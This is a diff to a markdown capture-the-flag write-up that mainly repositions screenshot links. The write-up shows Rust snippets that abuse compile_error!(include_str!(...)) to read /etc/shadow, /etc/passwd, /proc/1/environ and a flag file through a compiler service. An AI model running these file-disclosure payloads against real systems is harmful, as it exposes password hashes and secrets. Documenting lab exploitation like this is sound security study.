@@ -33,15 +33,17 @@ I started by exploring various system files to understand the scope of the file 
 
 #### Attempt 1: `/etc/group`
 
+![First attempt](image1.png)
+
 ```rust
 principal() {} compile_error!(include_str!("/etc/group"));
 ```
 
 **Result:** Successfully read `/etc/group` file, showing system groups.
 
-![First attempt](image2.png)
-
 #### Attempt 2: `/etc/shadow`
+
+![First attempt](image2.png)
 
 ```rust
 principal() {} compile_error!(include_str!("/etc/shadow"));
@@ -49,9 +51,9 @@ principal() {} compile_error!(include_str!("/etc/shadow"));
 
 **Result:** Successfully read `/etc/shadow` file, showing system user password hashes.
 
-![Second attempt](image3.png)
-
 #### Attempt 3: `/etc/passwd`
+
+![Second attempt](image3.png)
 
 ```rust
 principal() {} compile_error!(include_str!("/etc/passwd"));
@@ -59,9 +61,9 @@ principal() {} compile_error!(include_str!("/etc/passwd"));
 
 **Result:** Successfully read `/etc/passwd` file, revealing system users and their information.
 
-![Third attempt](image4.png)
-
 #### Attempt 4: `/proc/1/environ`
+
+![Third attempt](image4.png)
 
 ```rust
 principal() {} compile_error!(include_str!("/proc/1/environ"));
@@ -69,9 +71,9 @@ principal() {} compile_error!(include_str!("/proc/1/environ"));
 
 **Result:** Successfully read the environment variables of process 1.
 
-![Fourth attempt](image5.png)
-
 ### Step 3: Finding the Flag
+
+![Fourth attempt](image.png)
 
 #### Final Attempt: `/app/server/flag.txt` ✓
 
@@ -82,7 +84,7 @@ compile_error!(include_str!("/app/server/flag.txt"));
 
 **Result:** Success! The flag was found in the final attempt.
 
-![Flag found](image1.png)
+![Flag found](image.png)
 
 The output showed:
 
